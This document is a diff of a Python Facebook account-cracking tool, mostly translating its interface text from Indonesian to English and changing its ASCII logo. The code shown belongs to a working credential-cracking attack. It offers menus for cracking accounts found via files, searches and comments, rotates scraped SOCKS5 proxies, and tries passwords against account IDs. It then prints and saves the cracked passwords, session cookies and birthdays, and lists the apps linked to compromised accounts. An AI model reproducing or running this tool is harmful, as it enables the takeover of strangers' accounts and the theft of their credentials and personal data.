@@ -29,31 +29,28 @@ except ImportError:
 ###---[ANGGAP INI LOGO ]---###
 def logo():
 	return str(f"""  
-'##::: ##:'########:'##::::'##:'########::::'##:::::::'########:'##::::'##:'########:'##:::::::
- ###:: ##: ##.....::. ##::'##::... ##..::::: ##::::::: ##.....:: ##:::: ##: ##.....:: ##:::::::
- ####: ##: ##::::::::. ##'##:::::: ##::::::: ##::::::: ##::::::: ##:::: ##: ##::::::: ##:::::::
- ## ## ##: ######:::::. ###::::::: ##::::::: ##::::::: ######::: ##:::: ##: ######::: ##:::::::
- ##. ####: ##...:::::: ## ##:::::: ##::::::: ##::::::: ##...::::. ##:: ##:: ##...:::: ##:::::::
- ##:. ###: ##:::::::: ##:. ##::::: ##::::::: ##::::::: ##::::::::. ## ##::: ##::::::: ##:::::::
- ##::. ##: ########: ##:::. ##:::: ##::::::: ########: ########:::. ###:::: ########: ########:
-..::::..::........::..:::::..:::::..::::::::........::........:::::...:::::........::........::
- SCRIPT BY {kk}MR-ZIHAD{P}, VERSION {kk}PREMIUM{P} LIMITED USER""")
-
-			
+ _____  ___    _______  ___  ___  ___________  
+(\"   \|"  \  /"     "||"  \/"  |("     _   ") 
+|.\\   \    |(: ______) \   \  /  )__/  \\__/  
+|: \.   \\  | \/    |    \\  \/      \\_ /     
+|.  \    \. | // ___)_   /\.  \      |.  |     
+|    \    \ |(:      "| /  \   \     \:  |     
+ \___|\____\) \_______)|___/\___|     \__|     
+  SCRIPT BY {kk}MR-ZIHAD{P}, VERSION {kk}PREMIUM{P} LIMITED USER""")
 ###---[ USER BARU ]---###
 def newbie():
-	nama = input(f'{logo()}\n\n [{hh}<{P}] hi welcome, whats your name\n name :{kk} ');open('.nama.json','w').write(nama)
-	input(f' {P}hallo {kk}{nama}{P}, THIS IS A PREMIUM SCRIPT\n Limited Edition Please Use And\n DONT SELL IT, THANK YOU\n PLEASE ENTER THAN LOGIN OPTION')
+	nama = input(f'{logo()}\n\n [{hh}<{P}] WELCOME BRO, WHATS YOUR NAME\n NAME :{kk} ');open('.nama.json','w').write(nama)
+	input(f' {P}hallo {kk}{nama}{P}, THIS IS A PREMIUM SCRIPT\n LIMITED EDITION PLEASE USE AND\n DONT SELL IT, THANK YOU\n PLEASE ENTER THAN LOGIN OPTION')
 	
 
 ###---[ INFOMASI USER ]---###
 def prem_():
 	try:open('.cookie.txt','r').read();co='aktif'
-	except IOError:co='tidak'
+	except IOError:co='NO'
 	try:n=open('.nama.json','r').read()
 	except IOError:newbie()
 	string = '─────────────────────────────'
-	user = (f' {string}\n [{hh}>{P}] namamu : {hh}{n.lower()}{P}\n [{hh}>{P}] cookie : {hh}{co}{P}\n [{hh}>{P}] durasi : {hh}unlimited{P}\n {string}')
+	user = (f' {string}\n [{hh}>{P}] NAME : {hh}{n.lower()}{P}\n [{hh}>{P}] COOKIE : {hh}{co}{P}\n [{hh}>{P}] LIMIT : {hh}UNLIMITED{P}\n {string}')
 	return str(user)
 	
 	
@@ -103,7 +100,7 @@ def back():
 try:
 	clear_layar()
 	print(logo())
-	print(f'\r\n [{hh}>{P}] sedang dump proxy dan create useragent')
+	print(f'\r\n [{hh}>{P}] DUMPING PROXY AND CREATING USERAGENT')
 	try:os.remove('.proxy.txt')
 	except:pass
 	uno = ses.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
@@ -194,7 +191,7 @@ def login():
 		open('.cookie.txt','w').write(cookie)
 		open('.token.txt','w').write(token)
 		back()
-	except Exception as e:exit(f" [{M}>{P}] cookie invalid")
+	except Exception as e:exit(f" [{M}>{P}] COOKIE INVALID")
 					
 				
 ###---[ MENU NO LOGIN ]---###
@@ -202,7 +199,7 @@ def no_login():
 	clear_layar()
 	try:n=open('.nama.json','r').read()
 	except:newbie()
-	print(f'{logo()}\n{prem_()}\n [{hh}<{P}] selamat datang {kk}{n}{P}, pilih menu anda')
+	print(f'{logo()}\n{prem_()}\n [{hh}<{P}] WELCOME {kk}{n}{P}, SELECT MENU')
 	print(f" [{hh}1{P}] FILE CRACK")
 	print(f" [{hh}2{P}] SEARCH CRACK")
 	print(f" [{hh}3{P}] COMMENT CRACK")
@@ -218,7 +215,7 @@ def no_login():
 	elif ask in ['5','05']:crack_nomor()
 	elif ask in ['6','06']:cek_hasil()
 	elif ask in ['7','07']:pilih_login()
-	else:sys.exit(f" [{M}>{P}] isi yang benar")
+	else:sys.exit(f" [{M}>{P}] CORRECT")
 
 	
 ###---[ MENU LOGIN ]---###
@@ -459,13 +456,13 @@ def crack_foll(t,c):
 ###---[ ATUR SEBELUM CRACK ]---###
 akunok = []
 def atur_atur():
-	print(f"\r{P} ─────────────────────────────")
+	print(f"\r{P} ───────────────────────────────")
 	ro = input(f' [{hh}1{P}] MOBILE [{hh}2{P}] MBASIC [{hh}3{P}] FREE\n ENTER : ')
 	if ro in ['1','01']:metode.append('mobile')
 	elif ro in ['2','02']:metode.append('mbasic')
 	elif ro in ['3','03']:metode.append('free')
 	else:metode.append('mobile')
-	print(f"{P} ─────────────────────────────")
+	print(f"{P} ───────────────────────────────")
 	ch = input(f' [{hh}1{P}] OLDEST [{hh}2{P}] NEWEST [{hh}3{P}] RANDOM\n ENTER : ')
 	if ch in ['1','01']:
 		for x in dump:
@@ -677,12 +674,12 @@ def crack(idf,pwx,url,awal):
 							ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
 							m, d, y = ttl.split('/')
 							m = tete[m]
-							print(f'\r [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}\n [{kk}>{P}] lahir  : {kk}{d} {m} {y}{P}           \n')
+							print(f'\r [{kk}>{P}] NUMBER  : {kk}{idf}{P}          \n [{kk}>{P}] PASSWORD  : {kk}{pw}          {P}\n [{kk}>{P}] BORN  : {kk}{d} {m} {y}{P}           \n')
 							sapi = f'{idf}|{pw}|{d} {m} {y}'
 							open('CP/'+sim_cp,'a').write(sapi+'\n')
 							break
 						except:
-							print(f'\r [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}\n')
+							print(f'\r [{kk}>{P}] NUMBER  : {kk}{idf}{P}          \n [{kk}>{P}] PASSWORD  : {kk}{pw}          {P}\n')
 							open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
 							break
 					else:
@@ -697,7 +694,7 @@ def crack(idf,pwx,url,awal):
 					ok+=1
 					open('OK/'+sim_ok,'a').write(data+'\n')
 					if "coki" in akunok:
-						print(f'\r [{hh}>{P}] email  : {hh}{idf}{P}          \n [{hh}>{P}] sandi  : {hh}{pw}          {P}\n [{hh}>{P}] cookie : {hh}{kuki}{P}\n')
+						print(f'\r [{hh}>{P}] NUMBER  : {hh}{idf}{P}          \n [{hh}>{P}] PASSWORD  : {hh}{pw}          {P}\n [{hh}>{P}] COOKIE : {hh}{kuki}{P}\n')
 						break
 					elif "apk" in akunok:
 						cek_apk(idf,pw,kuki)
@@ -733,7 +730,7 @@ apk1, apk2, apk3 = [], [], []
 def cek_apk(idf,pw,kuki):
 	cookie = {"cookie" : kuki}
 	language(cookie)
-	akun = (f' [{hh}>{P}] email  : {hh}{idf}{P}          \n [{hh}>{P}] sandi  : {hh}{pw}          {P}\n [{hh}>{P}] cookie : {hh}{kuki}{P}')
+	akun = (f' [{hh}>{P}] NUMBER  : {hh}{idf}{P}          \n [{hh}>{P}] PASSWORD  : {hh}{pw}          {P}\n [{hh}>{P}] COOKIE : {hh}{kuki}{P}')
 	try:		
 		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
 		get_active(url,cookie)
@@ -749,7 +746,7 @@ def cek_apk(idf,pw,kuki):
 	print('\r'+akun)
 	if len(apk1)==0:pass
 	else:
-		akun = (f' [{hh}>{P}] aplikasi ditambahkan :                     ')
+		akun = (f' [{hh}>{P}] APP ADDED :                     ')
 		no = 0
 		for apk in apk1:
 			no += 1
@@ -757,7 +754,7 @@ def cek_apk(idf,pw,kuki):
 		print('\r'+akun)
 	if len(apk2)==0:pass
 	else:
-		akun = (f' {P}[{kk}>{P}] aplikasi kadaluwarsa :                   ')
+		akun = (f' {P}[{kk}>{P}] EXPIRED APPS :                   ')
 		no = 0
 		for apk in apk2:
 			no += 1
@@ -765,7 +762,7 @@ def cek_apk(idf,pw,kuki):
 		print('\r'+akun)
 	if len(apk3)==0:pass
 	else:
-		akun = (f' {P}[{M}>{P}] aplikasi yang dihapus :                  ')
+		akun = (f' {P}[{M}>{P}] DELETED APP :                  ')
 		no = 0
 		for apk in apk3:
 			no += 1
